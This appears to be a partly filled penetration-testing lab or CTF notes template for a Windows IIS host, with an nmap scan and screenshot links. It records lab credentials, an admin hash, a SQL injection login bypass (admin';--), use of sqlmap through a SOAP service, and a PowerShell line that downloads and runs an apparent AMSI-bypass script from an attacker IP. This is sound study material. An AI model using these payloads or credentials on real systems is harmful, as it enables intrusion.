# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 
- IP: `.24`

# Findings
### Credentials
`FoundCREDs`
## External
### Enumeration
```
PORT     STATE SERVICE       REASON         VERSION
80/tcp   open  http          syn-ack ttl 64 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 606A799E214585B4C12A462FB92E36E5
|_http-title: Offshore Dev
| http-methods:
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 64
3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB-WIN01.corp.local
| Issuer: commonName=WEB-WIN01.corp.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-01T03:20:05
| Not valid after:  2024-12-31T03:20:05
| MD5:   e840:a87c:c808:2c8a:0eaa:e863:9fcc:0b6b
| SHA-1: 5e0f:25db:9521:83d3:5cdb:d332:567c:fff7:bbc0:49a4
```
![](https://i.imgur.com/auK25s3.png)
- I used this on the HTTP auth` svc_iis : Vintage!`
### Gaining Access
![](https://i.imgur.com/Bt099tF.png)
![](https://i.imgur.com/6cHZrvz.png)
![](https://i.imgur.com/py2aO6s.png)
`admin';--`
![](https://i.imgur.com/Bawg0jI.png)


![](https://i.imgur.com/oaibEQo.png)
![](https://i.imgur.com/mWeNxhF.png)
- `os-shell` doesnt work
- ` admin : eb900f7d1ed53c96cd85dddb49c8ed4a `
![](https://i.imgur.com/pRWZUxy.png)
- it is soap so i parsed it to wsdl, by adding `?wsdl` to the url an dusing the burp `wsdler` -> parse to wsdl
- ![](https://i.imgur.com/HktA14M.png)
Then i added it to sqlmap and boom
![](https://i.imgur.com/XUeCkhY.png)
`IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/amsi-bp1.ps1')`
- when i try to get shell with sqlmap i got error on the xp_cmdshell but it open the shell so. i tried this on my computer
![](https://i.imgur.com/PpNZZ64.png)
![](https://i.imgur.com/OtslnI4.png)
- i got shell on [[SQL01]]
## Internal
### Enumeration
`$enum$`

### Gaining Access


### Maintaining Access


# Random Notes